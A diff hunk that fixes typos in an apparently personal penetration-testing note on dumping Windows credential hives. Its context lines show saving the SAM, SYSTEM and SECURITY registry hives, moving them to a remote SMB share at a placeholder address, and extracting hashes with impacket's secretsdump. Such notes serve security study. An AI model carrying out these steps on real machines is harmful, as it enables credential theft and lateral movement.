@@ -20,13 +20,13 @@ reg.exe save hklm\security C:\security.save
 ```
 Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.
 
-## Tarnsfer file
+## Transfer file
 We can create ftp, http or smb server to transfer these files to our linux machine.
 
 **Transfering to smb share from windows:**
 `move sam.save \\IP\sharename` same for system.save and security.save
 
-## Dumping hashes from linxu using hives:
+## Dumping hashes from linux using hives:
 
 We will use secretsdump from `/usr/share/doc/python3-impacket/examples`:
 ```bash
